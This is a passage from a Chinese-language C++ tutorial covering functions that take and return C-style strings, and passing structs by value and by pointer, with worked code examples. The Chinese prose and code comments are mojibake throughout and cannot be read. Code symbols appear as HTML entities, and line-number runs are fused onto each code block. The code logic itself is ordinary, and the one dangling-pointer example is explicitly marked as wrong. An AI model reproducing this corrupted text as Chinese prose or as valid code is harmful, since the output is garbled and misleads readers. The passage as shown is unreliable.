é€’çš„æ˜¯æŒ‡å‘å­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªå­—ç¬¦çš„æŒ‡é’ˆ (char*)ã€‚ å‡½æ•°ä¸éœ€è¦å•ç‹¬çš„å‚æ•°æ¥æŒ‡å®šå­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œå› ä¸ºå®ƒå¯ä»¥éå†å­—ç¬¦åºåˆ—ç›´åˆ°é‡åˆ°ç©ºå­—ç¬¦ \\0 æ¥ç¡®å®šå­—ç¬¦ä¸²çš„ç»“æŸã€‚ 7.5.1 å°† C-é£æ ¼å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°çš„å‡½æ•°å½“å‡½æ•°æ¥æ”¶ C-é£æ ¼å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°æ—¶ï¼Œé€šå¸¸ä½¿ç”¨ char* æˆ– const char* ç±»å‹ã€‚å¦‚æœå‡½æ•°ä¸æ‰“ç®—ä¿®æ”¹å­—ç¬¦ä¸²å†…å®¹ï¼Œå¼ºçƒˆå»ºè®®ä½¿ç”¨ const char*ï¼Œè¿™å¯ä»¥é˜²æ­¢æ„å¤–ä¿®æ”¹ï¼Œå¹¶å…è®¸å‡½æ•°æ¥å—å­—ç¬¦ä¸²å­—é¢å€¼ï¼ˆå®ƒä»¬æ˜¯å¸¸é‡ï¼‰å’Œ const å­—ç¬¦æ•°ç»„ä½œä¸ºå‚æ•°ã€‚ ç¤ºä¾‹ 1: è®¡ç®— C-é£æ ¼å­—ç¬¦ä¸²çš„é•¿åº¦ 123456789101112131415161718192021222324#include &lt;iostream&gt;// å‡½æ•°åŸå‹ï¼šè®¡ç®— C é£æ ¼å­—ç¬¦ä¸²çš„é•¿åº¦// ä½¿ç”¨ const char* å› ä¸ºæˆ‘ä»¬ä¸ä¿®æ”¹å­—ç¬¦ä¸²unsigned int string_length(const char* str) &#123; unsigned int length = 0; // å¾ªç¯ç›´åˆ°é‡åˆ°ç©ºå­—ç¬¦ &#x27;\\0&#x27; while (*str != &#x27;\\0&#x27;) &#123; length++; str++; // ç§»åŠ¨æŒ‡é’ˆåˆ°ä¸‹ä¸€ä¸ªå­—ç¬¦ &#125; return length;&#125;int main() &#123; char greeting[] = &quot;Hello&quot;; const char* message = &quot;World!&quot;; std::cout &lt;&lt; &quot;Length of \\&quot;&quot; &lt;&lt; greeting &lt;&lt; &quot;\\&quot;: &quot; &lt;&lt; string_length(greeting) &lt;&lt; std::endl; // è¾“å‡º: 5 std::cout &lt;&lt; &quot;Length of \\&quot;&quot; &lt;&lt; message &lt;&lt; &quot;\\&quot;: &quot; &lt;&lt; string_length(message) &lt;&lt; std::endl; // è¾“å‡º: 6 std::cout &lt;&lt; &quot;Length of \\&quot;C++\\&quot;: &quot; &lt;&lt; string_length(&quot;C++&quot;) &lt;&lt; std::endl; // è¾“å‡º: 3 return 0;&#125; ç¤ºä¾‹ 2: æ‰“å° C-é£æ ¼å­—ç¬¦ä¸² 123456789101112131415161718192021#include &lt;iostream&gt;// å‡½æ•°ï¼šæ‰“å° C é£æ ¼å­—ç¬¦ä¸²void print_string(const char* str) &#123; // å¯ä»¥ç›´æ¥ä½¿ç”¨ coutï¼Œå®ƒçŸ¥é“å¦‚ä½•å¤„ç† char* ç›´åˆ°é‡åˆ° &#x27;\\0&#x27; std::cout &lt;&lt; str; // æˆ–è€…æ‰‹åŠ¨éå† // while (*str != &#x27;\\0&#x27;) &#123; // std::cout &lt;&lt; *str; // str++; // &#125;&#125;int main() &#123; char name[] = &quot;Alice&quot;; std::cout &lt;&lt; &quot;Name: &quot;; print_string(name); std::cout &lt;&lt; std::endl; return 0;&#125; é‡è¦æ³¨æ„äº‹é¡¹: ç©ºå­—ç¬¦ç»ˆæ­¢: å¤„ç† C-é£æ ¼å­—ç¬¦ä¸²çš„å‡½æ•°ä¾èµ–äºç©ºå­—ç¬¦ \\0 æ¥ç¡®å®šç»“æŸã€‚å¦‚æœä¼ é€’çš„å­—ç¬¦æ•°ç»„æ²¡æœ‰æ­£ç¡®åœ°ä»¥ \\0 ç»“å°¾ï¼Œå‡½æ•°å¯èƒ½ä¼šè¯»å–è¶…å‡ºæ•°ç»„è¾¹ç•Œçš„å†…å­˜ï¼Œå¯¼è‡´æœªå®šä¹‰è¡Œä¸ºï¼ˆé€šå¸¸æ˜¯ç¨‹åºå´©æºƒæˆ–æ•°æ®æŸåï¼‰ã€‚ ç¼“å†²åŒºæº¢å‡º: å¦‚æœå‡½æ•°éœ€è¦ä¿®æ”¹ä¼ å…¥çš„å­—ç¬¦ä¸²æˆ–å°†æ•°æ®å†™å…¥å­—ç¬¦æ•°ç»„ç¼“å†²åŒºï¼ˆä¾‹å¦‚ strcpy, strcat çš„è‡ªå®šä¹‰ç‰ˆæœ¬ï¼‰ï¼Œå¿…é¡»ç¡®ä¿æ“ä½œä¸ä¼šè¶…å‡ºç¼“å†²åŒºçš„åˆ†é…å¤§å°ï¼Œå¦åˆ™ä¼šå‘ç”Ÿç¼“å†²åŒºæº¢å‡ºï¼Œè¿™æ˜¯ä¸€ä¸ªä¸¥é‡çš„å®‰å…¨æ¼æ´ã€‚é€šå¸¸éœ€è¦ä¼ é€’ç¼“å†²åŒºçš„å¤§å°ä½œä¸ºé¢å¤–å‚æ•°ã€‚ const æ­£ç¡®æ€§: æ˜ç¡®ä½¿ç”¨ const char* æ¥è¡¨ç¤ºå‡½æ•°ä¸ä¼šä¿®æ”¹è¾“å…¥å­—ç¬¦ä¸²ã€‚ 7.5.2 è¿”å› C-é£æ ¼å­—ç¬¦ä¸²çš„å‡½æ•°è®©å‡½æ•°è¿”å›ä¸€ä¸ª C-é£æ ¼å­—ç¬¦ä¸²ï¼ˆå³ char*ï¼‰æ¯”ä¼ é€’å®ƒè¦å¤æ‚å¾—å¤šï¼Œå¹¶ä¸”å……æ»¡äº†æ½œåœ¨çš„é™·é˜±ã€‚ä¸»è¦é—®é¢˜åœ¨äºå­—ç¬¦ä¸²æ•°æ®å­˜å‚¨åœ¨å“ªé‡Œä»¥åŠå…¶ç”Ÿå‘½å‘¨æœŸã€‚ å¸¸è§çš„é”™è¯¯æ–¹å¼ (å±é™©ï¼): è¿”å›æŒ‡å‘å±€éƒ¨å˜é‡çš„æŒ‡é’ˆ: 123456// !!! é”™è¯¯ä¸”å±é™©çš„ç¤ºä¾‹ !!!char* create_temp_string() &#123; char temp[] = &quot;Temporary&quot;; return temp; // é”™è¯¯ï¼temp æ˜¯å±€éƒ¨æ•°ç»„ï¼Œå‡½æ•°è¿”å›åå†…å­˜è¢«é‡Šæ”¾ // è¿”å›çš„æŒ‡é’ˆå°†æŒ‡å‘æ— æ•ˆå†…å­˜ (æ‚¬æŒ‚æŒ‡é’ˆ)&#125; è°ƒç”¨ create_temp_string() åå¾—åˆ°çš„æŒ‡é’ˆæ˜¯æ— æ•ˆçš„ï¼Œè§£å¼•ç”¨å®ƒä¼šå¯¼è‡´æœªå®šä¹‰è¡Œä¸ºã€‚ å¯è¡Œçš„ï¼ˆä½†å„æœ‰ç¼ºç‚¹ï¼‰æ–¹å¼: è¿”å›æŒ‡å‘é™æ€å±€éƒ¨å˜é‡çš„æŒ‡é’ˆ: 12345678910111213141516171819202122#include &lt;iostream&gt;// ä½¿ç”¨é™æ€å±€éƒ¨å˜é‡const char* get_static_message() &#123; static char message[] = &quot;Static Message&quot;; // message åœ¨ç¨‹åºæ•´ä¸ªç”Ÿå‘½å‘¨æœŸå†…å­˜åœ¨ï¼Œä½†åªæœ‰ä¸€ä¸ªå®ä¾‹ return message;&#125;int main() &#123; const char* msg1 = get_static_message(); std::cout &lt;&lt; &quot;Msg1: &quot; &lt;&lt; msg1 &lt;&lt; std::endl; // è¾“å‡º: Static Message // å¦‚æœå‡½æ•°è¢«å†æ¬¡è°ƒç”¨ï¼Œå®ƒä¼šè¿”å›æŒ‡å‘ *åŒä¸€ä¸ª* é™æ€å†…å­˜çš„æŒ‡é’ˆ // å¦‚æœå‡½æ•°å†…éƒ¨ä¿®æ”¹äº†é™æ€å˜é‡ï¼Œæ‰€æœ‰ä¹‹å‰çš„æŒ‡é’ˆéƒ½ä¼šçœ‹åˆ°å˜åŒ– // è¿™ç§æ–¹å¼ä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ const char* msg2 = get_static_message(); std::cout &lt;&lt; &quot;Msg2: &quot; &lt;&lt; msg2 &lt;&lt; std::endl; // è¾“å‡º: Static Message // msg1 å’Œ msg2 æŒ‡å‘åŒä¸€å—å†…å­˜ return 0;&#125; ç¼ºç‚¹: è¿”å›çš„æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜åœ¨åç»­è°ƒç”¨ä¸­å¯èƒ½è¢«è¦†ç›–ï¼ˆå¦‚æœå‡½æ•°ä¿®æ”¹é™æ€å˜é‡çš„è¯ï¼‰ï¼Œå¹¶ä¸”è¿™ç§æ–¹æ³•ä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚ è¿”å›æŒ‡å‘åŠ¨æ€åˆ†é…å†…å­˜çš„æŒ‡é’ˆ (new): 12345678910111213141516171819202122232425#include &lt;iostream&gt;#include &lt;cstring&gt; // ä¸ºäº† strcpy// è¿”å›åŠ¨æ€åˆ†é…çš„å†…å­˜char* create_dynamic_string(const char* initial_value) &#123; char* dynamic_str = new char[strlen(initial_value) + 1]; // åˆ†é…å†…å­˜ (+1 for &#x27;\\0&#x27;) strcpy(dynamic_str, initial_value); // å¤åˆ¶å†…å®¹ return dynamic_str; // è¿”å›æŒ‡å‘æ–°åˆ†é…å†…å­˜çš„æŒ‡é’ˆ&#125;int main() &#123; char* str1 = create_dynamic_string(&quot;Dynamic Data&quot;); std::cout &lt;&lt; &quot;Dynamic String 1: &quot; &lt;&lt; str1 &lt;&lt; std::endl; // !!! é‡è¦ï¼šè°ƒç”¨è€…å¿…é¡»è´Ÿè´£é‡Šæ”¾å†…å­˜ !!! delete[] str1; str1 = nullptr; // å¥½ä¹ æƒ¯ï¼šé‡Šæ”¾åç½®ç©ºæŒ‡é’ˆ char* str2 = create_dynamic_string(&quot;More Data&quot;); std::cout &lt;&lt; &quot;Dynamic String 2: &quot; &lt;&lt; str2 &lt;&lt; std::endl; delete[] str2; str2 = nullptr; return 0;&#125; ç¼ºç‚¹: è°ƒç”¨è€…å¿…é¡»è®°ä½ä½¿ç”¨ delete[] æ¥é‡Šæ”¾è¿”å›çš„æŒ‡é’ˆæ‰€æŒ‡å‘çš„å†…å­˜ï¼Œå¦åˆ™ä¼šå¯¼è‡´å†…å­˜æ³„æ¼ã€‚è¿™ç§è´£ä»»è½¬ç§»å¾ˆå®¹æ˜“å‡ºé”™ã€‚ ä¼ é€’ç”±è°ƒç”¨è€…åˆ†é…çš„ç¼“å†²åŒº (æ¨èæ–¹å¼): è¿™æ˜¯æœ€å®‰å…¨ã€æœ€å¸¸ç”¨çš„æ–¹æ³•ã€‚å‡½æ•°æ¥å—ä¸€ä¸ªæŒ‡å‘è°ƒç”¨è€…æä¾›çš„ç¼“å†²åŒºçš„æŒ‡é’ˆå’Œè¯¥ç¼“å†²åŒºçš„å¤§å°ï¼Œç„¶åå°†ç»“æœå­—ç¬¦ä¸²å†™å…¥è¯¥ç¼“å†²åŒºã€‚ 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;iostream&gt;#include &lt;cstring&gt; // ä¸ºäº† strncpy// å‡½æ•°å°†ç»“æœå†™å…¥è°ƒç”¨è€…æä¾›çš„ç¼“å†²åŒº// è¿”å›å€¼å¯ä»¥æŒ‡ç¤ºæˆåŠŸ/å¤±è´¥æˆ–å†™å…¥çš„å­—ç¬¦æ•°bool format_greeting(char buffer[], size_t buffer_size, const char* name) &#123; // ä½¿ç”¨ snprintf æˆ–å…¶ä»–å®‰å…¨å‡½æ•°æ¥é˜²æ­¢ç¼“å†²åŒºæº¢å‡º int written = snprintf(buffer, buffer_size, &quot;Hello, %s!&quot;, name); // æ£€æŸ¥æ˜¯å¦æˆåŠŸä¸”æœªæˆªæ–­ (snprintf è¿”å›å€¼ç‰¹æ€§) if (written &gt; 0 &amp;&amp; written &lt; buffer_size) &#123; return true; // æˆåŠŸ &#125; else &#123; // å¯èƒ½ç¼“å†²åŒºå¤ªå°æˆ–å‘ç”Ÿé”™è¯¯ if (buffer_size &gt; 0) buffer[0] = &#x27;\\0&#x27;; // ç¡®ä¿ç¼“å†²åŒºä¸ºç©ºå­—ç¬¦ä¸² return false; // å¤±è´¥ &#125;&#125;int main() &#123; const size_t BUF_SIZE = 50; char my_buffer[BUF_SIZE]; if (format_greeting(my_buffer, BUF_SIZE, &quot;Alice&quot;)) &#123; std::cout &lt;&lt; &quot;Formatted Greeting: &quot; &lt;&lt; my_buffer &lt;&lt; std::endl; // è¾“å‡º: Hello, Alice! &#125; else &#123; std::cerr &lt;&lt; &quot;Failed to format greeting (buffer too small?)&quot; &lt;&lt; std::endl; &#125; if (format_greeting(my_buffer, 10, &quot;Bob The Builder&quot;)) &#123; // å°è¯•ç”¨å°ç¼“å†²åŒº std::cout &lt;&lt; &quot;Formatted Greeting: &quot; &lt;&lt; my_buffer &lt;&lt; std::endl; &#125; else &#123; std::cerr &lt;&lt; &quot;Failed to format greeting (buffer too small?)&quot; &lt;&lt; std::endl; // è¿™å°†è¢«æ‰“å° std::cout &lt;&lt; &quot;Buffer content after fail: \\&quot;&quot; &lt;&lt; my_buffer &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // è¾“å‡º: &quot;&quot; (å› ä¸ºå‡½æ•°æ¸…ç©ºäº†) &#125; return 0;&#125; ä¼˜ç‚¹: å†…å­˜ç®¡ç†ç”±è°ƒç”¨è€…è´Ÿè´£ï¼Œå‡½æ•°æœ¬èº«ä¸åˆ†é…å†…å­˜ï¼Œé¿å…äº†å†…å­˜æ³„æ¼å’Œæ‚¬æŒ‚æŒ‡é’ˆçš„é£é™©ã€‚å‡½æ•°æ¥å£æ¸…æ™°åœ°è¡¨æ˜äº†å…¶å¯¹ç¼“å†²åŒºçš„éœ€æ±‚ã€‚ æ€»ç»“: å°† C-é£æ ¼å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ä¼ é€’ç»™å‡½æ•°æ—¶ï¼Œä¼ é€’çš„æ˜¯ char*ï¼Œå‡½æ•°ä¾èµ– \\0 ç¡®å®šç»“æŸï¼Œä½¿ç”¨ const char* é˜²æ­¢æ„å¤–ä¿®æ”¹ã€‚ è®©å‡½æ•°è¿”å› C-é£æ ¼å­—ç¬¦ä¸² (char*) æ¯”è¾ƒæ£˜æ‰‹ã€‚è¿”å›æŒ‡å‘å±€éƒ¨å˜é‡çš„æŒ‡é’ˆæ˜¯é”™è¯¯çš„ã€‚è¿”å›é™æ€å˜é‡æŒ‡é’ˆæœ‰å±€é™æ€§ã€‚è¿”å›åŠ¨æ€åˆ†é…å†…å­˜ (new) è¦æ±‚è°ƒç”¨è€…ç®¡ç†å†…å­˜ (delete[])ã€‚ æœ€å®‰å…¨ã€æœ€æ¨èçš„æ–¹å¼æ˜¯è®©è°ƒç”¨è€…æä¾›ç¼“å†²åŒºï¼Œå‡½æ•°å°†ç»“æœå†™å…¥è¯¥ç¼“å†²åŒºï¼Œå¹¶é€šå¸¸ä¼ é€’ç¼“å†²åŒºå¤§å°ä»¥é˜²æ­¢æº¢å‡ºã€‚ åœ¨ç°ä»£ C++ ä¸­ï¼Œé€šå¸¸æ›´æ¨èä½¿ç”¨ std::string ç±»æ¥å¤„ç†å­—ç¬¦ä¸²ï¼Œå› ä¸ºå®ƒä¼šè‡ªåŠ¨ç®¡ç†å†…å­˜ï¼Œé¿å…äº†è®¸å¤šä¸ C-é£æ ¼å­—ç¬¦ä¸²ç›¸å…³çš„é™·é˜±ã€‚ 7.6 å‡½æ•°å’Œç»“æ„ç»“æ„ (struct) æ˜¯ä¸€ç§ç”¨æˆ·å®šä¹‰çš„å¤åˆç±»å‹ï¼Œå¯ä»¥å°†ä¸åŒç±»å‹çš„æ•°æ®é¡¹ç»„åˆæˆä¸€ä¸ªå•ä¸€çš„å®ä½“ã€‚ä¸åŸºæœ¬æ•°æ®ç±»å‹ä¸€æ ·ï¼Œç»“æ„ä¹Ÿå¯ä»¥ä½œä¸ºå‚æ•°ä¼ é€’ç»™å‡½æ•°ï¼Œå¹¶ä¸”å‡½æ•°ä¹Ÿå¯ä»¥è¿”å›ç»“æ„ç±»å‹çš„å€¼ã€‚ 7.6.1 ä¼ é€’å’Œè¿”å›ç»“æ„é»˜è®¤æƒ…å†µä¸‹ï¼Œç»“æ„ä¸åŸºæœ¬æ•°æ®ç±»å‹ï¼ˆå¦‚ int, doubleï¼‰ä¸€æ ·ï¼Œæ˜¯æŒ‰å€¼ä¼ é€’ (Pass by Value) ç»™å‡½æ•°çš„ã€‚è¿™æ„å‘³ç€å½“å°†ä¸€ä¸ªç»“æ„å˜é‡ä½œä¸ºå®å‚ä¼ é€’ç»™å‡½æ•°æ—¶ï¼Œå‡½æ•°ä¼šåˆ›å»ºè¯¥ç»“æ„çš„ä¸€ä¸ªå®Œæ•´å‰¯æœ¬ï¼ˆå½¢å‚ï¼‰ï¼Œå¹¶åœ¨å‡½æ•°å†…éƒ¨æ“ä½œè¿™ä¸ªå‰¯æœ¬ã€‚å¯¹å‰¯æœ¬æˆå‘˜çš„ä»»ä½•ä¿®æ”¹éƒ½ä¸ä¼šå½±å“åŸå§‹ç»“æ„å˜é‡ã€‚ åŒæ ·ï¼Œå‡½æ•°ä¹Ÿå¯ä»¥å£°æ˜ä¸€ä¸ªç»“æ„ç±»å‹ä½œä¸ºå…¶è¿”å›ç±»å‹ã€‚å½“å‡½æ•°è¿”å›ä¸€ä¸ªç»“æ„æ—¶ï¼Œå®ƒä¼šåˆ›å»ºä¸€ä¸ªè¯¥ç»“æ„çš„ä¸´æ—¶å‰¯æœ¬ï¼Œå¹¶å°†å…¶è¿”å›ç»™è°ƒç”¨è€…ã€‚ ç¤ºä¾‹ï¼šæŒ‰å€¼ä¼ é€’å’Œè¿”å›ç»“æ„ 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;#include &lt;string&gt; // ä½¿ç”¨ string ç±»æˆå‘˜// å®šä¹‰ä¸€ä¸ªç®€å•çš„ç»“æ„struct Point &#123; double x; double y;&#125;;// å‡½æ•°åŸå‹ï¼šæŒ‰å€¼æ¥æ”¶ Point ç»“æ„ï¼Œå¹¶æ‰“å°å…¶åæ ‡void display_point(Point p) &#123; // p æ˜¯ pt_main çš„å‰¯æœ¬ std::cout &lt;&lt; &quot;Displaying Point (inside function): (&quot; &lt;&lt; p.x &lt;&lt; &quot;, &quot; &lt;&lt; p.y &lt;&lt; &quot;)&quot; &lt;&lt; std::endl; // ä¿®æ”¹å‰¯æœ¬çš„å€¼ï¼Œä¸ä¼šå½±å“åŸå§‹ç»“æ„ p.x = 100.0; std::cout &lt;&lt; &quot;Modified copy inside function: (&quot; &lt;&lt; p.x &lt;&lt; &quot;, &quot; &lt;&lt; p.y &lt;&lt; &quot;)&quot; &lt;&lt; std::endl;&#125;// å‡½æ•°åŸå‹ï¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ Point ç»“æ„å¹¶æŒ‰å€¼è¿”å›Point create_point(double x_val, double y_val) &#123; Point new_p; new_p.x = x_val; new_p.y = y_val; std::cout &lt;&lt; &quot;Creating Point (&quot; &lt;&lt; new_p.x &lt;&lt; &quot;, &quot; &lt;&lt; new_p.y &lt;&lt; &quot;) inside create_point.&quot; &lt;&lt; std::endl; return new_p; // è¿”å› Point ç»“æ„çš„å‰¯æœ¬&#125;int main() &#123; Point pt_main = &#123;3.0, 4.0&#125;; std::cout &lt;&lt; &quot;Before calling display_point: (&quot; &lt;&lt; pt_main.x &lt;&lt; &quot;, &quot; &lt;&lt; pt_main.y &lt;&lt; &quot;)&quot; &lt;&lt; std::endl; // æŒ‰å€¼ä¼ é€’ pt_main display_point(pt_main); std::cout &lt;&lt; &quot;After calling display_point: (&quot; &lt;&lt; pt_main.x &lt;&lt; &quot;, &quot; &lt;&lt; pt_main.y &lt;&lt; &quot;)&quot; &lt;&lt; std::endl; // åŸå§‹ç»“æ„æœªæ”¹å˜ std::cout &lt;&lt; &quot;\\nCalling create_point...&quot; &lt;&lt; std::endl; // æ¥æ”¶å‡½æ•°è¿”å›çš„ Point ç»“æ„å‰¯æœ¬ Point pt_returned = create_point(5.5, -1.2); std::cout &lt;&lt; &quot;Returned Point in main: (&quot; &lt;&lt; pt_returned.x &lt;&lt; &quot;, &quot; &lt;&lt; pt_returned.y &lt;&lt; &quot;)&quot; &lt;&lt; std::endl; return 0;&#125; è¾“å‡º: 12345678Before calling display_point: (3, 4)Displaying Point (inside function): (3, 4)Modified copy inside function: (100, 4)After calling display_point: (3, 4)Calling create_point...Creating Point (5.5, -1.2) inside create_point.Returned Point in main: (5.5, -1.2) æŒ‰å€¼ä¼ é€’çš„ä¼˜ç¼ºç‚¹: ä¼˜ç‚¹: ä¿æŠ¤åŸå§‹æ•°æ®ä¸è¢«å‡½æ•°ä¿®æ”¹ï¼Œæ¦‚å¿µç®€å•ã€‚ ç¼ºç‚¹: å¯¹äºåŒ…å«å¤§é‡æ•°æ®æˆå‘˜çš„ç»“æ„ï¼Œå¤åˆ¶æ•´ä¸ªç»“æ„å¯èƒ½æ•ˆç‡ä½ä¸‹ï¼Œæ¶ˆè€—æ—¶é—´å’Œå†…å­˜ã€‚ 7.6.2 å¦ä¸€ä¸ªå¤„ç†ç»“æ„çš„å‡½æ•°ç¤ºä¾‹å‡è®¾æˆ‘ä»¬éœ€è¦ä¸€ä¸ªå‡½æ•°æ¥è®¡ç®—ä¸¤ä¸ªç‚¹ä¹‹é—´çš„ä¸­ç‚¹ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;struct Point &#123; double x; double y;&#125;;// å‡½æ•°ï¼šè®¡ç®—ä¸¤ä¸ª Point çš„ä¸­ç‚¹ï¼Œå¹¶è¿”å›ä¸€ä¸ªæ–°çš„ PointPoint find_midpoint(Point p1, Point p2) &#123; Point midpoint; midpoint.x = (p1.x + p2.x) / 2.0; midpoint.y = (p1.y + p2.y) / 2.0; return midpoint;&#125;// è¾…åŠ©å‡½æ•°ï¼šæ‰“å° Point (æŒ‰å€¼ä¼ é€’)void print_point(Point p) &#123; std::cout &lt;&lt; &quot;(&quot; &lt;&lt; p.x &lt;&lt; &quot;, &quot; &lt;&lt; p.y &lt;&lt; &quot;)&quot;;&#125;int main() &#123; Point start_point = &#123;1.0, 1.0&#125;; Point end_point = &#123;5.0, 7.0&#125;; std::cout &lt;&lt; &quot;Start point: &quot;; print_point(start_point); std::cout &lt;&lt; std::endl; std::cout &lt;&lt; &quot;End point: &quot;; print_point(end_point); std::cout &lt;&lt; std::endl; // è°ƒç”¨å‡½æ•°è®¡ç®—ä¸­ç‚¹ Point mid = find_midpoint(start_point, end_point); std::cout &lt;&lt; &quot;Midpoint: &quot;; print_point(mid); // è¾“å‡º: (3, 4) std::cout &lt;&lt; std::endl; return 0;&#125; è¿™ä¸ªä¾‹å­å†æ¬¡å±•ç¤ºäº†æŒ‰å€¼ä¼ é€’ç»“æ„ï¼ˆp1, p2 æ˜¯å‰¯æœ¬ï¼‰å’ŒæŒ‰å€¼è¿”å›ç»“æ„ï¼ˆmidpoint çš„å‰¯æœ¬è¢«è¿”å›ï¼‰ã€‚ 7.6.3 ä¼ é€’ç»“æ„çš„åœ°å€ä¸ºäº†é¿å…å¤åˆ¶æ•´ä¸ªç»“æ„çš„å¼€é”€ï¼Œç‰¹åˆ«æ˜¯å½“ç»“æ„å¾ˆå¤§æ—¶ï¼Œæˆ–è€…å½“éœ€è¦å‡½æ•°èƒ½å¤Ÿä¿®æ”¹åŸå§‹ç»“æ„æ—¶ï¼Œå¯ä»¥ä¼ é€’ç»“æ„çš„åœ°å€ï¼ˆå³æŒ‡å‘ç»“æ„çš„æŒ‡é’ˆï¼‰è€Œä¸æ˜¯ç»“æ„æœ¬èº«ã€‚ æ–¹æ³•: å‡½æ•°å‚æ•°: å£°æ˜ä¸ºæŒ‡å‘ç»“æ„ç±»å‹çš„æŒ‡é’ˆ (struct_type*)ã€‚ å‡½æ•°è°ƒç”¨: ä½¿ç”¨åœ°å€è¿ç®—ç¬¦ &amp; è·å–ç»“æ„å˜é‡çš„åœ°å€ä¼ é€’ç»™å‡½æ•°ã€‚ è®¿é—®æˆå‘˜: åœ¨å‡½æ•°å†…éƒ¨ï¼Œéœ€è¦ä½¿ç”¨é—´æ¥æˆå‘˜è®¿é—®è¿ç®—ç¬¦ -&gt; (ç®­å¤´è¿ç®—ç¬¦) æ¥è®¿é—®æŒ‡é’ˆæŒ‡å‘çš„ç»“æ„çš„æˆå‘˜ã€‚æˆ–è€…ï¼Œå…ˆè§£å¼•ç”¨æŒ‡é’ˆ *ptrï¼Œç„¶åå†ä½¿ç”¨ç‚¹è¿ç®—ç¬¦ .ï¼Œå³ (*ptr).memberã€‚ptr-&gt;member æ˜¯ (*ptr).member çš„ç®€æ´å†™æ³•ã€‚ ç¤ºä¾‹ï¼šæŒ‰æŒ‡é’ˆä¼ é€’ç»“æ„ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#include &lt;iostream&gt;struct Rectangle &#123; double width; double height;&#125;;// å‡½æ•°åŸå‹ï¼šæ¥æ”¶æŒ‡å‘ Rectangle çš„æŒ‡é’ˆï¼Œè®¡ç®—é¢ç§¯// ä½¿ç”¨ const è¡¨ç¤ºå‡½æ•°ä¸ä¼šé€šè¿‡æŒ‡é’ˆä¿®æ”¹ç»“æ„å†…å®¹double calculate_area(const Rectangle* rect_ptr) &#123; // æ£€æŸ¥ç©ºæŒ‡é’ˆæ˜¯ä¸€ç§å¥½çš„é˜²å¾¡æ€§ç¼–ç¨‹ä¹ æƒ¯ if (rect_ptr == nullptr) &#123; std::cerr &lt;&lt; &quot;Error: Null pointer passed to calculate_area.&quot; &lt;&lt; std::endl; return 0.0; &#125; // ä½¿ç”¨ç®­å¤´è¿ç®—ç¬¦ -&gt; è®¿é—®æˆå‘˜ return rect_ptr-&gt;width * rect_ptr-&gt;height; // æˆ–è€…ä½¿ç”¨ (*rect_ptr).width * (*rect_ptr).height&#125;// å‡½æ•°åŸå‹ï¼šæ¥æ”¶æŒ‡å‘ Rectangle çš„æŒ‡é’ˆï¼Œå¹¶ä¿®æ”¹å…¶å°ºå¯¸ (æ”¾å¤§)void scale_rectangle(Rectangle* rect_ptr, double factor) &#123; if (rect_ptr == nullptr || factor &lt;= 0) &#123; std::cerr &lt;&lt; &quot;Error: Invalid arguments for scale_rectangle.&quot; &lt;&lt; std::endl; return; &#125; rect_ptr-&gt;width *= factor; // ä¿®æ”¹åŸå§‹ç»“æ„ rect_ptr-&gt;height *= factor; // ä¿®æ”¹åŸå§‹ç»“æ„&#125;// è¾…åŠ©å‡½æ•°ï¼šæ‰“å° Rectangle (æŒ‰æŒ‡é’ˆä¼ é€’ï¼Œä½¿ç”¨ const)void print_rectangle(const Rectangle* rect_ptr) &#123; if (rect_ptr == nullptr) return; std::cout &lt;&lt; &quot;Rectangle [Width=&quot; &lt;&lt; rect_ptr-&gt;width &lt;&lt; &quot;, Height=&quot; &lt;&lt; rect_ptr-&gt;height &lt;&lt; &quot;]&quot;;&#125;int main() &#123; Rectangle box = &#123;10.0, 5.0&#125;; std::cout &lt;&lt; &quot;Original Box: &quot;; print_rectangle(&amp;box); std::cout &lt;&lt; std::endl; // ä¼ é€’ box çš„åœ°å€ç»™ calculate_area double area = calculate_area(&amp;box); std::cout &lt;&lt; &quot;Area: &quot; &lt;&lt; area &lt;&lt; std::endl; // è¾“å‡º: 50 // ä¼ é€’ box çš„åœ°å€ç»™ scale_rectangle ä»¥ä¿®æ”¹å®ƒ scale_rectangle(&amp;box, 2.0); // æ”¾å¤§ä¸¤å€ std::cout &lt;&lt; &quot;Scaled Box: &quot;; print_rectangle(&amp;box); // æ‰“å°ä¿®æ”¹åçš„åŸå§‹ box std::cout &lt;&lt; std::endl; // è¾“å‡º: Rectangle [Width=20, Height=10] // é‡æ–°è®¡ç®—é¢ç§¯ area = calculate_area(&amp;box); std::cout &lt;&lt; &quot;New Area: &quot; &lt;&lt; area &lt;&lt; std::endl; // è¾“å‡º: 200 return 0;&#125; æŒ‰æŒ‡é’ˆä¼ é€’çš„ä¼˜ç¼ºç‚¹: ä¼˜ç‚¹: æ•ˆç‡é«˜ï¼Œåªä¼ é€’åœ°å€ï¼Œä¸å¤åˆ¶æ•´ä¸ªç»“æ„ã€‚ å…è®¸å‡½æ•°ä¿®æ”¹åŸå§‹ç»“æ„æ•°æ®ã€‚ ç¼ºç‚¹: è¯­æ³•ç¨å¤æ‚ï¼ˆéœ€è¦ä½¿ç”¨ &amp; è·å–åœ°å€ï¼Œä½¿ç”¨ -&gt; æˆ– (*). è®¿é—®æˆå‘˜ï¼‰ã€‚ å¯èƒ½æ„å¤–ä¿®æ”¹åŸå§‹æ•°æ®ï¼ˆé™¤éä½¿ç”¨ constï¼‰ã€‚ éœ€è¦å¤„ç†ç©ºæŒ‡é’ˆçš„å¯èƒ½æ€§ã€‚ æŒ‰å¼•ç”¨ä¼ é€’ (Pass by Reference): C++ è¿˜æä¾›äº†å¦ä¸€ç§é¿å…å¤åˆ¶å¹¶å…è®¸ä¿®æ”¹åŸå§‹æ•°æ®çš„æ–¹å¼ï¼šæŒ‰å¼•ç”¨ä¼ é€’ã€‚è¿™å°†åœ¨ç¬¬ 8 ç« è¯¦ç»†ä»‹ç»ã€‚æŒ‰å¼•ç”¨ä¼ 